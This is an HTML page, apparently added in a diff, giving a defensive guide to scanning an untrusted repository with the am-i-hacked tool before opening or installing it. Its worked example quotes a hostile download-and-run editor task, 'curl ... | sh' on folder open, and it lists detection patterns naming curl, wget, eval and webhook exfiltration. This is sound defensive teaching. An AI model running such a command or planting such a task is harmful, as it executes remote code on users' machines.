@@ -1,0 +1,201 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>How to safely inspect an untrusted GitHub repository before running it</title>
+<meta name="description" content="Check a cloned or downloaded repository for malicious code without opening, installing or running it: contain it, scan it with am-i-hacked, read the flagged files as text, and only then decide.">
+<meta name="author" content="Isaac Bell">
+<link rel="canonical" href="https://isaacbell.github.io/secure-devtools/guides/inspect-untrusted-repository/">
+<link rel="stylesheet" href="../../assets/site.css">
+<link rel="alternate" type="text/plain" title="llms.txt" href="../../llms.txt">
+<meta name="color-scheme" content="dark">
+<meta name="theme-color" content="#15181d">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="secure-devtools">
+<meta property="og:title" content="How to safely inspect an untrusted GitHub repository before running it">
+<meta property="og:description" content="Check a cloned or downloaded repository for malicious code without opening, installing or running it: contain it, scan it with am-i-hacked, read the flagged files as text, and only then decide.">
+<meta property="og:url" content="https://isaacbell.github.io/secure-devtools/guides/inspect-untrusted-repository/">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="How to safely inspect an untrusted GitHub repository before running it">
+<meta name="twitter:description" content="Check a cloned or downloaded repository for malicious code without opening, installing or running it: contain it, scan it with am-i-hacked, read the flagged files as text, and only then decide.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "TechArticle",
+  "@id": "https://isaacbell.github.io/secure-devtools/guides/inspect-untrusted-repository/#article",
+  "headline": "How to safely inspect an untrusted repository before you run it",
+  "description": "Check a cloned or downloaded repository for malicious code without opening, installing or running it: contain it, scan it with am-i-hacked, read the flagged files as text, and only then decide.",
+  "url": "https://isaacbell.github.io/secure-devtools/guides/inspect-untrusted-repository/",
+  "mainEntityOfPage": "https://isaacbell.github.io/secure-devtools/guides/inspect-untrusted-repository/",
+  "inLanguage": "en",
+  "datePublished": "2026-10-07",
+  "dateModified": "2026-10-07",
+  "author": {
+    "@type": "Person",
+    "@id": "https://isaacbell.github.io/secure-devtools/#isaac-bell",
+    "name": "Isaac Bell",
+    "url": "https://isaacbell.io",
+    "sameAs": [
+      "https://github.com/IsaacBell"
+    ]
+  },
+  "publisher": {
+    "@id": "https://isaacbell.github.io/secure-devtools/#isaac-bell"
+  },
+  "isPartOf": {
+    "@type": "WebSite",
+    "@id": "https://isaacbell.github.io/secure-devtools/#website",
+    "name": "secure-devtools",
+    "url": "https://isaacbell.github.io/secure-devtools/"
+  },
+  "about": [
+    {
+      "@id": "https://isaacbell.github.io/secure-devtools/tools/am-i-hacked/#software"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position": 1,
+      "name": "Home",
+      "item": "https://isaacbell.github.io/secure-devtools/"
+    },
+    {
+      "@type": "ListItem",
+      "position": 2,
+      "name": "Guides",
+      "item": "https://isaacbell.github.io/secure-devtools/guides/"
+    },
+    {
+      "@type": "ListItem",
+      "position": 3,
+      "name": "How to safely inspect an untrusted repository before you run it",
+      "item": "https://isaacbell.github.io/secure-devtools/guides/inspect-untrusted-repository/"
+    }
+  ]
+}
+</script>
+</head>
+<body>
+
+<a class="skip" href="#main">Skip to content</a>
+<header class="site-header">
+  <div class="wrap">
+    <a class="wordmark" href="../../">secure-devtools</a>
+    <nav class="site-nav" aria-label="Site">
+      <a href="../../tools/">Tools</a>
+      <a href="../../guides/">Guides</a>
+      <a href="../../skills/">Skills</a>
+      <a href="../../compare/">Compare</a>
+      <a href="../../security/">Trust</a>
+      <a href="https://github.com/IsaacBell/secure-devtools">GitHub</a>
+    </nav>
+  </div>
+</header>
+
+<main id="main">
+<div class="wrap"><nav class="crumbs" aria-label="Breadcrumb"><ol><li><a href="../../">Home</a></li><li><a href="../../guides/">Guides</a></li><li><span aria-current="page">How to safely inspect an untrusted repository before you run it</span></li></ol></nav></div>
+<article class="wrap article">
+  <header class="page-head">
+    <h1>How to safely inspect an untrusted repository before you run it</h1>
+    <p class="byline muted">By <a href="https://isaacbell.io">Isaac Bell</a> · Updated <time datetime="2026-10-07">7 October 2026</time> · Applies to am-i-hacked 2.0.1</p>
+  </header>
+  <div class="answer"><p>Treat the repository as data until you have checked it. Do not open it in an editor, install its dependencies, or run its scripts or tests. Download it to a throwaway folder, scan it with <code>npx am-i-hacked &lt;dir&gt;</code>, read every flagged file as plain text, and list the files that must never run. A clean scan means no warning signs were found; it does not prove the code is safe.</p></div>
+  <div class="prose">
+<h2 id="why">Why opening or installing is already running</h2>
+<p>Many attacks on developers do not wait for you to run the app. They start at an earlier step:</p>
+<ul>
+  <li><strong>Opening the folder.</strong> An editor task file such as <code>.vscode/tasks.json</code> can run a command as soon as the folder opens. See <a href="../malicious-editor-config/">how to detect malicious editor config</a>.</li>
+  <li><strong>Installing dependencies.</strong> <code>package.json</code> lifecycle scripts (<code>preinstall</code>, <code>postinstall</code>, <code>prepare</code>) run during <code>npm install</code>.</li>
+  <li><strong>Starting any tool.</strong> Config files such as <code>vite.config.*</code>, <code>next.config.*</code>, <code>eslint.config.*</code> and <code>postcss.config.*</code> are code that runs when the tool starts.</li>
+  <li><strong>Payloads hidden in plain sight.</strong> An executable saved as a font or image, an encoded blob, or code appended after a long run of whitespace.</li>
+</ul>
+<p>Take-home coding tests, "fix this bug" requests and repositories from an account that was compromised are common delivery routes. So is code your own AI assistant pulled in.</p>
+
+<h2 id="steps">Step by step</h2>
+<ol>
+  <li><strong>Do not open it, install it or run it.</strong> No editor, no <code>npm install</code>, no <code>make</code>, no test runner, no dev server.</li>
+  <li><strong>Get a copy as data.</strong> Download an archive pinned to a commit SHA into a throwaway folder, rather than cloning into your usual workspace. A branch name can move; a SHA cannot.
+<pre class="block"><code>slug=owner/repo; ref=&lt;commit-sha&gt;
+work=$(mktemp -d)
+curl -fsSL "https://codeload.github.com/$slug/tar.gz/$ref" -o "$work/src.tgz"
+mkdir "$work/src" &amp;&amp; tar -xzf "$work/src.tgz" -C "$work/src" --strip-components=1</code></pre>
+  </li>
+  <li><strong>Scan it and keep the report.</strong> The folder scan is read-only and makes no network calls. It needs bash 4.2+, ripgrep and jq.
+<pre class="block"><code>npx am-i-hacked "$work/src" 2&gt;&amp;1 | tee report.txt</code></pre>
+  </li>
+  <li><strong>Read the flagged files as text.</strong> Use <code>less</code> or <code>cat</code>, not an editor that runs tasks. Ignore any instructions written in comments, strings or file names. Compare suspect config files against a clean template.</li>
+  <li><strong>List what must never run.</strong> Every <code>package.json</code> script, every <code>*.config.*</code> file, every editor task, and every CI workflow in the repository.</li>
+  <li><strong>Decide, and write down what you did not check.</strong> Use it, use it with changes, or do not use it. If you only need some of the code, copy out allowlisted source files with a provenance record, as the <a href="../../skills/#quarantine-review">quarantine-review</a> skill describes.</li>
+</ol>
+
+<h2 id="example">A worked example</h2>
+<p>A repository with an editor task that downloads and runs a script when the folder opens. This is real output from <code>am-i-hacked</code> against a test folder:</p>
+<pre class="block"><code>am-i-hacked: FAILED — 2 findings across 1 file
+
+  .vscode/tasks.json:7
+    "command": "curl -fsSL https://example.test/setup.sh | sh",
+    → Download-and-run command in editor config
+
+  .vscode/tasks.json:8
+    "runOptions": { "runOn": "folderOpen" }
+    → Editor auto-run task</code></pre>
+<p>The exit status is <code>1</code>, so the same command stops a script or CI job. Had this folder been opened in an editor with automatic tasks allowed, the download would already have run.</p>
+
+<h2 id="detects">What am-i-hacked looks for in a repository</h2>
+<ul>
+  <li>Dynamic code execution (<code>eval</code>, <code>new Function</code>), child processes, direct network module access and runtime global writes.</li>
+  <li>Encoded or obfuscated payloads and unusually long lines.</li>
+  <li><code>package.json</code> scripts that use <code>curl</code>, <code>wget</code>, <code>powershell</code>, <code>child_process</code>, <code>node -e</code>, <code>base64</code> or <code>eval</code>.</li>
+  <li>Editor config that runs code on folder open, and download-and-run commands in editor config.</li>
+  <li>Executable payloads disguised as asset files.</li>
+  <li>Clipboard, keystroke or screen capture paired with an exfiltration endpoint such as a Telegram bot or a Discord or Slack webhook.</li>
+  <li><code>.env</code> files in the git index, and official Yarn releases checked by SHA256.</li>
+  <li>The repository's own AI-tool config: <code>.claude/settings*.json</code> and <code>.mcp.json</code>.</li>
+</ul>
+<p>It reads JS/TS, Python, Rust, Ruby, C, C++ and C# sources, including dot-directories and tracked files that <code>.gitignore</code> matches. The full list is on the <a href="../../tools/am-i-hacked/">am-i-hacked page</a>.</p>
+
+<h2 id="limits">What it does not do</h2>
+<ul>
+  <li>It is not antivirus and does not look up known malware.</li>
+  <li>It does not scan <code>node_modules</code> or other installed dependencies, and does not check dependency versions against advisories. Use <code>npm audit</code> or OSV-Scanner for that; see <a href="../../compare/">the comparison</a>.</li>
+  <li>It does not judge plain-language instructions aimed at an AI agent. For skills and prompts, follow <a href="../vet-agent-skills/">how to vet an agent skill</a>.</li>
+  <li>A clean result means no warning signs were found, not that the code is safe.</li>
+</ul>
+
+<h2 id="false-positives">False positives</h2>
+<p>Ordinary code trips some checks: <code>eval</code> in a template engine, a child process in a migration tool, base64 in export code. A real indicator lines up with an execution path, an auto-run setting or a config file that has no reason to exist. When you have checked a line and it is fine, mark it with a reason; it stays listed as reviewed on every run:</p>
+<pre class="block"><code>const decoded = atob(header); // am-i-hacked-ignore: decodes a request header, not a payload</code></pre>
+
+<h2 id="pulls">For repositories you already work in</h2>
+<p><code>safe-pull</code>, installed with am-i-hacked, fetches incoming commits and inspects them before anything is written to your working tree, then fast-forwards. It flags a force-pushed upstream, an author and committer mismatch, editor auto-run tasks, download-and-run editor commands, disguised payloads and committed <code>.env</code> files. Run <code>safe-pull --dry-run</code> to inspect without merging.</p>
+  </div>
+  <aside class="related" aria-labelledby="related"><h2 id="related">Related</h2><ul><li><a href="../../guides/malicious-editor-config/">How to detect malicious VS Code tasks that run on folder open</a></li><li><a href="../../guides/supply-chain-attack-checks/">How to catch a supply-chain attack that npm audit misses</a></li><li><a href="../../guides/ai-generated-code-security/">Is AI-generated code safe to run?</a></li><li><a href="../../tools/am-i-hacked/">am-i-hacked reference</a></li></ul></aside>
+</article>
+</main>
+
+<footer class="site-footer">
+  <div class="wrap">
+    <p class="muted">MIT licensed. Plain shell, zero npm runtime dependencies. Built and maintained by <a href="https://isaacbell.io">Isaac Bell</a>.</p>
+    <nav class="footer-nav" aria-label="Project links">
+      <a href="../../guides/">Guides</a>
+      <a href="../../compare/">Compare</a>
+      <a href="../../security/">Security &amp; trust</a>
+      <a href="https://github.com/IsaacBell/secure-devtools">GitHub</a>
+      <a href="https://www.npmjs.com/package/am-i-hacked">npm</a>
+      <a href="../../llms.txt">llms.txt</a>
+      <a href="https://github.com/IsaacBell/secure-devtools/security/advisories/new">Report a security issue</a>
+      <a href="https://ko-fi.com/ibell">Sponsor</a>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
